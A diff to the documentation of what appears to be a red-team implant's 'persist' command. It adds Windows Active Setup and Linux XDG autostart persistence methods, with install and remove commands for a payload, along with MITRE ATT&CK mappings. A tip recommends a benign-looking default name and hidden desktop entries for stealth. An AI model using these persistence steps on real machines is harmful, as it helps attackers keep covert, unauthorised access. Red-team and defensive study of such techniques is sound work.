@@ -163,9 +163,48 @@ persist -method accessibility -action remove -name sethc.exe
 
 {{% notice info %}}Supported targets: sethc.exe (Sticky Keys), utilman.exe (Ease of Access), osk.exe (On-Screen Keyboard), narrator.exe (Narrator), magnify.exe (Magnifier).{{% /notice %}}
 
+### Active Setup Persistence
+
+{{% notice info %}}Windows Only{{% /notice %}}
+
+Register a StubPath command under Active Setup in HKLM. Active Setup runs the StubPath once per user at first logon. Survives profile resets and affects all users. Requires admin.
+
+Install:
+```
+persist -method active-setup -action install -path "C:\Windows\Temp\payload.exe"
+```
+
+Install with custom GUID:
+```
+persist -method active-setup -action install -name "{CUSTOM-GUID}" -path "C:\Windows\Temp\payload.exe"
+```
+
+Remove:
+```
+persist -method active-setup -action remove -name "{A9E1B7F2-3D4C-5E6F-7A8B-9C0D1E2F3A4B}"
+```
+
+### XDG Autostart Persistence
+
+{{% notice info %}}Linux Only{{% /notice %}}
+
+Create a `.desktop` file in `~/.config/autostart/` that runs at graphical login. Works on GNOME, KDE, XFCE, MATE, and other freedesktop-compliant environments.
+
+Install:
+```
+persist -method xdg-autostart -action install -path "/tmp/agent" -name "my-service"
+```
+
+Remove:
+```
+persist -method xdg-autostart -action remove -name "my-service"
+```
+
+{{% notice tip %}}Default name is "system-update-notifier" — a benign-looking name. The .desktop file is created with NoDisplay=true and Hidden=false for stealth.{{% /notice %}}
+
 ### List Existing Persistence
 
-Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, IFEO debugger entries, Winlogon helper values, print processors, accessibility binary integrity, and screensaver settings:
+Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, IFEO debugger entries, Active Setup entries, Winlogon helper values, print processors, accessibility binary integrity, screensaver settings, XDG autostart entries:
 ```
 persist -method list
 ```
@@ -265,3 +304,5 @@ persist -method list
 - T1547.004 — Boot or Logon Autostart Execution: Winlogon Helper DLL
 - T1547.012 — Boot or Logon Autostart Execution: Print Processors
 - T1546.008 — Event Triggered Execution: Accessibility Features
+- T1547.014 — Boot or Logon Autostart Execution: Active Setup
+- T1547.013 — Boot or Logon Autostart Execution: XDG Autostart Entries
